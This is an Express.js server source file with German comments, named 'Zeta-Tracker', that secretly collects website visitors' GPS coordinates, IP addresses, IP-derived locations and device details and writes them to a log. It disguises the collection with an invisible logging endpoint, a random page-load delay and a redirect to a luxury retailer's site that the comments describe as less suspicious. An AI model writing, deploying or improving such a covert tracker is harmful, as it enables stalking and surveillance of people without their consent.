const express = require('express');
const path = require('path');
const fs = require('fs');
const geoip = require('geoip-lite'); // Für IP-Geolocation
const app = express();
const PORT = process.env.PORT || 10000;

// 1. Render-spezifische Einstellungen
app.set('trust proxy', true); // Wichtig für korrekte IP-Erkennung hinter Render-Proxies
app.use(express.static('public')); // Statische Dateien (index.html)

// 2. GPS-Logging (unsichtbar)
app.get('/log-gps', (req, res) => {
    const { lat, lon, accuracy } = req.query;
    const ip = req.ip.split(',')[0]; // Render gibt mehrere IPs zurück
    const geo = geoip.lookup(ip);
    const userAgent = req.headers['user-agent'];
    
    // Formatierter Log-Eintrag
    const logEntry = `[${new Date().toISOString()}]
IP: ${ip} | Location: ${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}
Device: ${userAgent}
GPS: ${lat || 'N/A'}, ${lon || 'N/A'} (±${accuracy || 'N/A'}m)
----------------------------\n`;

    fs.appendFileSync('gps.log', logEntry);
    res.sendStatus(204); // Keine Antwort im Browser
});

// 3. Tarn-Weiterleitung (mit Verzögerung)
app.get('/redirect', (req, res) => {
    // Optional: IP vor Weiterleitung loggen (falls GPS blockiert)
    const ip = req.ip;
    fs.appendFileSync('gps.log', `[${new Date().toISOString()}] IP: ${ip} | GPS: BLOCKED\n`);
    
    res.redirect(302, 'https://de.loropiana.com'); // 302 = Temporär, weniger verdächtig
});

// 4. Hauptseite mit Tracking-Trigger
app.get('/', (req, res) => {
    // Zufällige Verzögerung (1-3s) für natürlich wirkendes Tracking
    setTimeout(() => {
        res.sendFile(path.join(__dirname, 'public', 'index.html'));
    }, Math.floor(Math.random() * 2000) + 1000);
});

// 5. Render-spezifischer Health Check (wichtig für Monitoring)
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.listen(PORT, () => console.log(`✅ Zeta-Tracker läuft im Stealth-Modus auf Port ${PORT}`));
